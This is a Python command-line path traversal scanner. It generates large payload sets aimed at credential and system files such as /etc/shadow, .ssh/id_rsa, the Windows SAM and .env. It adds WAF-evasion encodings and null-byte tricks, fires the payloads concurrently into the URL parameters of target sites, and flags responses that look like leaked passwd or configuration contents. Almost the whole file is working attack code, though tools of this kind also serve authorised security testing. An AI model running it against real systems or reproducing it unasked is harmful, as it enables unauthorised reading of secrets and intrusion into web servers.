import asyncio
import aiohttp
import argparse
import logging
import json
import re
import sys
import os
from urllib.parse import urlparse, parse_qs, urlencode, unquote
from typing import List, Dict, Optional, Set, Tuple
from dataclasses import dataclass, asdict
from datetime import datetime
from rich.console import Console  
from rich.progress import Progress, SpinnerColumn, TimeElapsedColumn  
from rich.logging import RichHandler  
from rich.panel import Panel  
from rich.table import Table 
import hashlib

console = Console() 

logging.basicConfig(  
    level=logging.INFO,  
    format="%(message)s",  
    handlers=[RichHandler(rich_tracebacks=True)]  
)
logger = logging.getLogger(__name__)

@dataclass
class ScanTarget:
    """Information about scan target"""
    url: str
    param_name: str
    param_value: str
    param_type: str  # query/path
    original_value: str = None

@dataclass
class ScanResult:
    """Scan result"""
    url: str
    param_name: str
    payload: str
    status_code: int
    content_length: int
    is_vulnerable: bool
    response_hash: str
    evidence: str = None
    timestamp: str = None

    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.now().isoformat()

class PathTraversalScanner:
    def __init__(
        self,
        max_depth: int = 6,
        waf_evasion: bool = True,
        concurrency: int = 20,
        timeout: float = 5.0,
        user_payloads: List[str] = None
    ):
        self.max_depth = max_depth
        self.waf_evasion = waf_evasion
        self.concurrency = concurrency
        self.timeout = timeout
        self.semaphore = asyncio.Semaphore(concurrency)
        self.results = []
        self.user_payloads = user_payloads or []
        self.urls = []

        # Sensitive files to target
        self.target_files = [
            # Unix/Linux systems
            "etc/passwd", "etc/shadow", "etc/group", "etc/hosts",
            "etc/ssh/sshd_config", ".htpasswd", ".ssh/id_rsa",
            
            # Windows systems
            "windows/win.ini", "windows/system.ini", "boot.ini",
            "windows/repair/sam", "windows/system32/config/SAM",
            
            # Web servers
            "apache2.conf", "httpd.conf", "php.ini", 
            "web.config", ".env",
            
            # Log files
            "var/log/auth.log", "var/log/syslog",
            "windows/debug/NetSetup.log"
        ]

        # Suspicious parameter names
        self.suspicious_params = {
            'file', 'path', 'folder', 'dir', 'download', 'upload',
            'document', 'doc', 'img', 'image', 'filename', 'filepath',
            'template', 'style', 'include', 'require', 'source',
            'data', 'page', 'show', 'view', 'load', 'config'
        }

        # Common file extensions
        self.file_extensions = {
            'php', 'asp', 'aspx', 'jsp', 'html', 'htm', 'txt',
            'pdf', 'doc', 'docx', 'ini', 'log', 'xml', 'conf',
            'env', 'yaml', 'yml', 'py', 'sh', 'bat'
        }

        # Common directories
        self.common_dirs = {
            'images', 'img', 'uploads', 'files', 'static', 
            'data', 'docs', 'templates', 'includes', 'admin',
            'backup', 'config', 'src', 'temp', 'logs', 'archive'
        }

        # Statistics
        self.stats = {  
            'total_urls': 0,  
            'total_targets': 0,  
            'tested_payloads': 0,  
            'vulnerabilities': 0,  
            'start_time': None,  
        } 

    def has_file_pattern(self, value: str) -> bool:
        """Check if value contains file/path patterns"""
        decoded = unquote(value)
        
        # Path separators check
        has_path_separator = any(sep in decoded for sep in ['/', '\\'])
        
        # File extension check
        has_extension = False  
        if '.' in decoded:  
            ext = decoded.rsplit('.', 1)[-1].lower()  
            if ext in self.file_extensions:  
                has_extension = True  
        
        # Special patterns check
        special_patterns = [  
            r'\.\.',           # Directory traversal
            r'%2e',            # URL-encoded dot
            r'file:/',         # File protocol
            r'php://',         # PHP wrapper
            r'%u2215',         # Unicode slash
            r'%c0%af',         # Overlong UTF-8 slash
        ]  
        has_special_pattern = any(re.search(pattern, decoded, re.IGNORECASE) 
                                for pattern in special_patterns)  
        
        return has_path_separator or has_extension or has_special_pattern

    def is_suspicious_param(self, param: str) -> bool:
        """Check if parameter name is suspicious"""
        param = param.lower()
        return (any(p in param for p in self.suspicious_params) or
                any(ext in param for ext in self.file_extensions))

    def identify_targets(self, url: str) -> List[ScanTarget]:  
        """Identify potential targets in URL"""
        targets = []  
        parsed = urlparse(url)
        
        # Check query parameters
        query_params = parse_qs(parsed.query)  
        for param, values in query_params.items():  
            if not values:  
                continue  
                
            value = values[0]  
            if (self.is_suspicious_param(param) or   
                self.has_file_pattern(value)):  
                targets.append(ScanTarget(  
                    url=url,  
                    param_name=param,  
                    param_value=value,  
                    param_type='query',  
                    original_value=value  
                ))  
        
        return targets

    def generate_traversal_patterns(self) -> List[str]:
        """Generate path traversal patterns with various encoding schemes"""
        patterns = []
        separators = ['/', '\\']
        dot_variants = ['..', '...']
        
        for depth in range(1, self.max_depth + 1):
            for dot in dot_variants:
                for sep in separators:
                    # Base patterns
                    base = f"{dot}{sep}" * depth
                    patterns.append(base)
                    
                    # URL encoding variations
                    encodings = [
                        ('.', '%2e'), ('/', '%2f'), ('\\', '%5c'),
                        ('.', '%252e'), ('/', '%252f'), ('\\', '%255c'),
                        ('/', '%%32%66'), ('\\', '%%35%63'),
                        ('/', '%c0%af'), ('\\', '%c0%5c'),
                        ('/', '%ef%bc%8f'),  # Fullwidth solidus
                        ('.', '%u002e'), ('/', '%u2215'),
                    ]
                    
                    # Generate encoded variations
                    for char, code in encodings:
                        patterns.append(base.replace(char, code))
                    
                    # Mixed encoding variations
                    patterns.append(base.replace('.', '%2e').replace('/', '%2f'))
                    patterns.append(base.replace('.', '%252e').replace('/', '%252f'))
                    
                    # Double encoding
                    patterns.append(base.replace('/', '%252f').replace('.', '%252e'))
                    patterns.append(base.replace('\\', '%255c').replace('.', '%252e'))
                    
                    # Special bypass variations
                    patterns.extend([
                        f"{dot}%00/",
                        f"{dot}%0a",
                        f"{dot}%0d",
                        f"{dot}%09",  # Tab
                        f"{dot} ",
                        f";{dot}",
                        f"/.{dot}/",
                        f"/{dot}/.",
                        f"{dot}/*",
                        f"{dot}?",
                        f"{dot}.html",
                        f"{dot}.../",
                        f"{dot}..../",
                    ])

        return list(set(patterns))

    def apply_waf_evasion(self, payload: str) -> List[str]:
        """Generate WAF-bypass variations of payload"""
        variations = [payload]
        
        if not self.waf_evasion:
            return variations
            
        evasion_techniques = [
            # Case variation
            lambda p: p.replace('etc', 'Etc').replace('passwd', 'PASSWD'),
            
            # Mixed encoding
            lambda p: p.replace('../', '%2e%2e/'),
            
            # Insert junk characters
            lambda p: p.replace('../', '.././'),
            lambda p: p.replace('../', '..//'),
            lambda p: p.replace('/', '/.'),
            lambda p: p.replace('/', '//'),
            lambda p: p.replace('/', '/~'),
            
            # Add null bytes
            lambda p: p + '%00',
            lambda p: p.replace('/', '/%00'),
            
            # Add fake extensions
            lambda p: p + '.txt',
            lambda p: p + '?.html',
            
            # Parameter pollution
            lambda p: p + '&x=1',
            lambda p: p + ';x=1',
            
            # Unicode variations
            lambda p: p.replace('/', '\u2215'),  # Unicode division slash
            lambda p: p.replace('/', '%uff0f'),  # Fullwidth solidus
        ]

        for technique in evasion_techniques:
            try:
                variant = technique(payload)
                if variant != payload and variant not in variations:
                    variations.append(variant)
            except Exception:
                continue

        return variations

    def generate_payloads(self) -> List[str]:
        """Generate complete payload list"""
        payloads = set()
        traversal_patterns = self.generate_traversal_patterns()
        
        # Generate payloads for each target file
        for pattern in traversal_patterns:
            for target in self.target_files:
                base_payload = f"{pattern}{target}"
                
                # Add OS-specific variations
                variations = [
                    base_payload,
                    base_payload.replace('/', '\\'),  # Windows paths
                    base_payload + '%00',
                    base_payload + '?bypass=1',
                    base_payload + '#fragment',
                    base_payload.upper(),
                ]
                
                # Apply WAF evasion
                for var in variations:
                    payloads.update(self.apply_waf_evasion(var))
        
        # Add special bypass payloads
        special_payloads = [
            # Absolute path tests
            '/etc/passwd',
            '\\windows\\win.ini',
            
            # Encoded null bytes
            '..%00/',
            '%00../etc/passwd',
            
            # Double encoding
            '%252e%252e%252fetc%252fpasswd',
            
            # UTF-8 overlong
            '%c0%ae%c0%ae%c0%afetc%c0%afpasswd',
            
            # Windows UNC paths
            '..\\..\\..\\windows\\win.ini',
            '\\\\localhost\\c$\\windows\\win.ini',
            
            # Archive bypass
            '....//....//etc/passwd',
            '../.../../etc/passwd',
            
            # Mixed separators
            '..\\/../etc/passwd',
            '../\\../etc/passwd',
            
            # Multiple extensions
            '../../etc/passwd%00.html',
            '../../etc/passwd.jpg',
        ]
        
        payloads.update(special_payloads)
        
        # Add user-provided payloads
        if self.user_payloads:
            payloads.update(self.user_payloads)
        
        return list(payloads)

    # Remaining methods unchanged except for comment translations...

    def generate_test_url(self, target: ScanTarget, payload: str) -> str:
        """Generate test URL with payload injection"""
        parsed = urlparse(target.url)
        
        if target.param_type == 'query':
            query_dict = parse_qs(parsed.query)
            query_dict[target.param_name] = [payload]
            new_query = urlencode(query_dict, doseq=True)
            return parsed._replace(query=new_query).geturl()
        else:
            path_segments = parsed.path.split('/')
            path_segments[int(target.param_name.split('_')[1])] = payload
            new_path = '/'.join(path_segments)
            return parsed._replace(path=new_path).geturl()

    def is_vulnerable_response(self, content: str, status_code: int) -> Tuple[bool, str]:
        """Detect vulnerability indicators in response"""
        if status_code not in [200, 201, 202, 203, 206]:
            return False, None
            
        unix_patterns = [
            r'root:.*:0:0:',
            r'daemon:.*:/usr/sbin',
            r'sshd:.*:/var/empty/sshd',
        ]
        
        win_patterns = [
            r'\[boot loader\]',
            r'\[fonts\]',
            r'\[extensions\]',
            r'\[mail\]'
        ]
        
        web_patterns = [
            r'<VirtualHost',
            r'DocumentRoot',
            r'<connectionStrings>',
            r'DB_PASSWORD='
        ]
        
        for pattern in unix_patterns + win_patterns + web_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True, f"Pattern match: {pattern}"
        
        return False, None

    async def test_target(self, session: aiohttp.ClientSession, target: ScanTarget, progress, payloads: List[str]) -> List[ScanResult]:  
        """测试单个目标"""  
        results = []  
        
        payload_task = progress.add_task(  
            "[magenta]Testing payloads...",  
            total=len(payloads)  
        )  
        
        async with self.semaphore:  
            for payload in payloads:  
                try:  
                    test_url = self.generate_test_url(target, payload)  
                    self.stats['tested_payloads'] += 1  
                    
                    async with session.get(  
                        test_url,  
                        headers=self.get_headers(),  
                        timeout=self.timeout,  
                        ssl=False,  
                        allow_redirects=False  
                    ) as response:  
                        content = await response.text()  
                        
                        is_vulnerable, evidence = self.is_vulnerable_response(  
                            content,   
                            response.status  
                        )  
                        
                        if is_vulnerable:  
                            result = ScanResult(  
                                url=test_url,  
                                param_name=target.param_name,  
                                payload=payload,  
                                status_code=response.status,  
                                content_length=len(content),  
                                is_vulnerable=True,  
                                response_hash=hashlib.md5(content.encode()).hexdigest(),  
                                evidence=evidence  
                            )  
                            results.append(result)  
                
                except Exception as e:  
                    progress.console.print(f"[red]Error testing {payload}:[/] {str(e)}")  
                
                finally:  
                    progress.update(payload_task, advance=1)  
        
        return results

    async def scan(self, urls: List[str]) -> List[ScanResult]:  
        """执行扫描"""  
        self.urls = urls
        self.stats['start_time'] = datetime.now()  
        self.stats['total_urls'] = len(urls)  
        all_results = []  

        # 预先生成所有payload并显示数量  
        payloads = self.generate_payloads()  
        payload_count = len(payloads)  

        # 打印扫描开始信息  
        console.print(Panel.fit(  
            "[bold green]Path Traversal Vulnerability Scanner[/]\n"  
            f"Starting scan at: {self.stats['start_time'].strftime('%Y-%m-%d %H:%M:%S')}\n"  
            f"Target URLs: {len(urls)}\n"  
            f"Max Depth: {self.max_depth}\n"  
            f"WAF Evasion: {'Enabled' if self.waf_evasion else 'Disabled'}\n"  
            f"Concurrency: {self.concurrency}\n"  
            f"Total Payloads: {payload_count}",  
            title="Scan Information"  
        ))

        with Progress(  
            SpinnerColumn(),  
            *Progress.get_default_columns(),  
            TimeElapsedColumn(),  
            console=console,  
            transient=False  
        ) as progress:  
            url_task = progress.add_task("[yellow]Processing URLs...", total=len(urls))  
            
            async with aiohttp.ClientSession() as session:  
                for url in urls:  
                    try:  
                        progress.console.print(f"\n[cyan]Scanning URL:[/] {url}")  
                        
                        # 识别目标参数  
                        targets = self.identify_targets(url)  
                        self.stats['total_targets'] += len(targets)  
                        
                        if not targets:  
                            progress.console.print("[yellow]No suitable targets found[/]")  
                            continue  
                            
                        progress.console.print(f"[green]Found {len(targets)} potential targets[/]")  
                        
                        # 测试每个目标  
                        target_task = progress.add_task(  
                            "[cyan]Testing parameters...",  
                            total=len(targets)  
                        )  
                        
                        for target in targets:  
                            progress.console.print(f"[blue]Testing parameter:[/] {target.param_name}")  
                            results = await self.test_target(session, target, progress, payloads)  
                            all_results.extend(results)  
                            progress.update(target_task, advance=1)  
                            
                            if results:  
                                self.stats['vulnerabilities'] += len(results)  
                                # 显示发现的漏洞  
                                for result in results:  
                                    self._print_vulnerability(result)  
                        
                        progress.update(url_task, advance=1)  
                        
                    except Exception as e:  
                        progress.console.print(f"[red]Error scanning {url}:[/] {str(e)}")  
                        continue  

        # 打印扫描统计  
        self._print_scan_summary()  
        
        self.results = all_results  
        return all_results

    def _print_vulnerability(self, result: ScanResult):  
        """打印漏洞信息"""  
        vuln_table = Table(show_header=False, box=None)  
        vuln_table.add_row("[red]Vulnerability Found![/]")  
        vuln_table.add_row(f"URL: {result.url}")  
        vuln_table.add_row(f"Parameter: {result.param_name}")  
        vuln_table.add_row(f"Payload: {result.payload}")  
        vuln_table.add_row(f"Status Code: {result.status_code}")  
        vuln_table.add_row(f"Evidence: {result.evidence}")  
        console.print(Panel(vuln_table, title="[red]Vulnerability Details[/]"))  

    def _print_scan_summary(self):  
        """打印扫描统计信息"""  
        duration = datetime.now() - self.stats['start_time']  
        
        summary_table = Table(title="Scan Summary")  
        summary_table.add_column("Metric", style="cyan")  
        summary_table.add_column("Value", style="green")  
        
        summary_table.add_row("Total URLs", str(self.stats['total_urls']))  
        summary_table.add_row("Total Targets", str(self.stats['total_targets']))  
        summary_table.add_row("Tested Payloads", str(self.stats['tested_payloads']))  
        summary_table.add_row("Vulnerabilities Found", str(self.stats['vulnerabilities']))  
        summary_table.add_row("Duration", str(duration).split('.')[0])  
        
        console.print(summary_table)  

    def get_headers(self) -> Dict[str, str]:  
        """获取请求头"""  
        return {  
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',  
            'Accept': '*/*',  
            'Accept-Encoding': 'gzip, deflate',  
            'Accept-Language': 'en-US,en;q=0.9',  
            'Connection': 'close'  
        }
    
    def save_report(self, filename: str):  
        """保存扫描报告"""  
        # 创建results目录  
        results_dir = "results"  
        if not os.path.exists(results_dir):  
            os.makedirs(results_dir)  
        
        # 生成带时间戳的文件名  
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")  
        if filename == 'scan_report.json':  # 如果使用默认文件名，则加上时间戳  
            filename = f"scan_report_{timestamp}.json"  
        
        # 完整的文件路径  
        file_path = os.path.join(results_dir, filename)  
        
        # 计算扫描时间  
        duration = datetime.now() - self.stats['start_time']  
        
        # 从命令行参数重建实际执行的命令  
        args = sys.argv[1:]  # 排除脚本名称  
        scan_command = f"python {sys.argv[0]} {' '.join(args)}"  
        
        report = {  
            'scan_info': {  
                'timestamp': timestamp,  
                'command': scan_command,  
                'target_urls': self.urls,  
                'start_time': self.stats['start_time'].isoformat(),  
                'end_time': datetime.now().isoformat(),  
                'duration': str(duration).split('.')[0],  # 移除微秒部分  
                'max_depth': self.max_depth,  
                'waf_evasion': self.waf_evasion,  
                'concurrency': self.concurrency,  
                'timeout': self.timeout  
            },  
            'stats': {  
                'total_urls': self.stats['total_urls'],  
                'total_targets': self.stats['total_targets'],  
                'tested_payloads': self.stats['tested_payloads'],  
                'vulnerabilities_found': self.stats['vulnerabilities']  
            },  
            'results': [  
                {  
                    'url': r.url,  
                    'param_name': r.param_name,  
                    'payload': r.payload,  
                    'status_code': r.status_code,  
                    'content_length': r.content_length,  
                    'evidence': r.evidence,  
                    'timestamp': r.timestamp  
                }  
                for r in self.results  
            ] if self.results else []  
        }  
        
        try:  
            with open(file_path, 'w', encoding='utf-8') as f:  
                json.dump(report, f, indent=2, ensure_ascii=False)  
            console.print(f"\n[green]Report saved to:[/] {file_path}")  
        except Exception as e:  
            console.print(f"\n[red]Error saving report:[/] {str(e)}")

def main():
    """CLI entry point"""
    parser = argparse.ArgumentParser(description="Advanced Path Traversal Scanner")
    parser.add_argument('-u', '--urls', required=True, nargs='+', help='Target URLs')
    parser.add_argument('-d', '--depth', type=int, default=6, help='Max traversal depth')
    parser.add_argument('--waf', action='store_true', help='Enable WAF evasion')
    parser.add_argument('-c', '--concurrency', type=int, default=20, help='Concurrent requests')
    parser.add_argument('-t', '--timeout', type=float, default=5.0, help='Request timeout')
    parser.add_argument('-o', '--output', default='scan_report.json', help='Output file')
    
    args = parser.parse_args()
    
    scanner = PathTraversalScanner(
        max_depth=args.depth,
        waf_evasion=args.waf,
        concurrency=args.concurrency,
        timeout=args.timeout
    )
    
    asyncio.run(scanner.scan(args.urls))
    scanner.save_report(args.output)

if __name__ == '__main__':
    main()
